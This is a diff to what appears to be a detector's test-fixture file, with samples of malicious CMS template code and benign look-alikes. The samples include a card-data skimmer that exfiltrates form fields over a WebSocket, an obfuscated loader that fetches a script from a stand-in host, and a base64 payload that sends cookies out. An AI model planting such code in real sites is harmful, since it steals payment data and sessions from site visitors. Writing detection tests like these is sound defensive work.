@@ -330,6 +330,20 @@ expect = "critical"
 content = "var f=document.querySelectorAll('input');var w=new WebSocket('wss://sock.evil.example/x');w.onopen=function(){var o={};for(var i=0;i<f.length;i++){o[f[i].name]=f[i].value}o.cc=document.getElementById('cc_number').value;w.send(btoa(JSON.stringify(o)))};"
 
 [[sample]]
+name = "cms_block_loader_split_names"
+class = "template"
+expect = "warning"
+rule = "js_hidden_loader"
+content = "<div class=\"footer-note\">Versand ab 50 EUR frei.</div>\n<script>var a = window['at' + 'ob']; var s = document['createEl' + 'ement']('script'); s.src = a('aHR0cHM6Ly9ldmlsLmV4YW1wbGUvYy5qcw=='); document.head.appendChild(s);</script>"
+
+[[sample]]
+name = "cms_block_payload_in_atob"
+class = "template"
+expect = "critical"
+rule = "js_encoded_payload_loader"
+content = "<p>Unsere Zahlungsarten</p>\n<script>var k = 'dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHBzOi8vY2RuLmV2aWwtbWV0cmljcy5leGFtcGxlL2MuanM/ZD0nK2J0b2EoZG9jdW1lbnQuY29va2llKTtkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKHMpOw=='; var r = window['Fun' + 'ction']; r(window['at' + 'ob'](k))();</script>"
+
+[[sample]]
 name = "benign_sentence_concat"
 class = "php"
 expect = "clean"
@@ -406,3 +420,15 @@ name = "benign_ca_bundle_text"
 class = "other"
 expect = "clean"
 content = "-----BEGIN CERTIFICATE-----\nMIIDdzCCAl+gAwIBAgIEAgAAuTANBgkqhkiG9w0BAQUFADBaMQswCQYDVQQGEwJJ\n-----END CERTIFICATE-----\n"
+
+[[sample]]
+name = "benign_cms_block_tag_manager"
+class = "template"
+expect = "clean"
+content = "<p>It's our summer sale - don't miss it!</p>\n<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-XXXX');</script>"
+
+[[sample]]
+name = "benign_cms_block_inline_svg"
+class = "template"
+expect = "clean"
+content = "<img alt=\"Logo\" src=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCI+PGNpcmNsZSBjeD0iMTIiIGN5PSIxMiIgcj0iMTAiLz48L3N2Zz4=\">"
